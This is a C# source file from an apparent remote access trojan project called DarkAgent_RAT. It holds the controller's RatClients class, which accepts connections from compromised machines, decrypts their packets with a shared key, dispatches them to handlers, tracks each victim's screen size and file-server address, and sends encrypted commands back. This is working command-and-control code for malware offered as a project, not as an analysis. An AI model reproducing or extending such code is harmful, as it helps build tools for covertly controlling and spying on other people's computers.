using System;
using System.Collections.Generic;
using System.Text;
using System.Net.Sockets;
using System.Net;
using System.Threading;
using DarkAgent_RAT.src.Network.DataNetwork.Packets;
using DarkAgent_RAT.src.Engines;
using DarkAgent_RAT.src.Utils;
using DarkAgent_RAT.src.Events;
using DarkAgent_RAT.src.Objects;
using DarkAgent_RAT.src.Network.DataNetwork.Packets.Send;
using System.IO;
using DarkAgent_RAT.src.Network.DataNetwork;
using DarkAgent_RAT.src.Network.FileServer.Packets.Send;
using System.Drawing;

//credits DragonHunter

namespace DarkAgent_RAT.src.Network
{
    public class RatClients
    {
        public delegate void DisconnectHandler(RatClients client);
        private Socket _socket;
        private byte[] _buffer;
        public DisconnectHandler DisconnectHandle {get;set;}
        private FloodProtector _FloodProtector;
        public int ClientID;
        public int NetworkKey;
        public Point ScreenSize;
        public string FileServerRemoteIP;

        public RatClients(Socket socket, int key)
        {
            _socket = socket;
            NetworkKey = key;
            _FloodProtector = new FloodProtector(2000, 1000);
            Read();
        }

        private void Read()
        {
            //Read first 2 bytes of the packet, this contains the size.
            _buffer = new byte[2];
            try { _socket.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.Partial, new AsyncCallback(ReadCallbackStatic), null); } catch {}
        }

        private void ReadCallbackStatic(IAsyncResult ar)
        {
            try
            {
                if (_socket.EndReceive(ar) > 1)
                {
                    if (_FloodProtector.HandleFlood(_socket.RemoteEndPoint) == false)
                    {
                        Disconnect();
                        return;
                    }

                    //Get length from the buffer, convert to Int16 and read the rest of the packet.
                    _buffer = new byte[BitConverter.ToInt16(_buffer, 0) - 2];//-2 for the length, we already read that :P

                    if (_buffer.Length > 10000) //ignore packets that are bigger then 10kb
                        return;

                    if (_buffer.Length > 0)
                    {
                        _socket.Receive(_buffer, _buffer.Length, SocketFlags.Partial);
                        _buffer = CryptEngine.Crypt(_buffer, NetworkKey);
                        Type pck = ClientPacketProcessor.ProcessPacket(_buffer, _socket.RemoteEndPoint.ToString());
                        if (pck != null)
                        {
                            ReceiveBasePacket rbp = (ReceiveBasePacket)Activator.CreateInstance(pck, this, _buffer);
                            rbp.Run();
                            settings.ReceivedPackets++;
                        }
                        else
                        {
                            //unknown packet received
                            Disconnect();
                            return;
                        }

                        Read();
                        return;
                    }
                    else
                    {
                        //Disconnect when no length is given... maybe flood? just disconnect :P
                        Disconnect();
                        return;
                    }
                }
                else
                {
                    Disconnect();
                    return;
                }
            }
            catch
            {
                if(!_socket.Connected)
                    Disconnect();
                return;
            }
        }

        public void SendPacket(SendBasePacket packet)
        {
            lock(this)
            {
                packet.Write();
                byte[] pck = packet.ToByteArray();

                byte PacketId = pck[0];
                pck = CryptEngine.Crypt(pck, NetworkKey);

                List<Byte> FullPacket = new List<Byte>();
                FullPacket.AddRange(BitConverter.GetBytes((short)(pck.Length + 2))); //+2 Packet Length
                FullPacket.AddRange(pck);
                try { _socket.Send(FullPacket.ToArray()); } catch { }
                settings.SendedPackets++;
            }
        }

        private void Disconnect()
        {
            ClientDisconnectEventArgs e1 = new ClientDisconnectEventArgs(_socket.RemoteEndPoint.ToString());
            ClientDisconnectEvent.OnClientDisconnect(e1);

            settings.ClientsConnected--;
            Logger.AddLog(new LogInfo("Client disconnected", _socket.RemoteEndPoint.ToString().Split(':')[0]));

            _socket.Disconnect(false);
            if (DisconnectHandle != null) DisconnectHandle(this);
            MaxConnections.Disconnect(_socket.RemoteEndPoint);
        }

        public IPEndPoint RemoteEndPoint
        {
            get { return (IPEndPoint)_socket.RemoteEndPoint; }
        }
    }
}
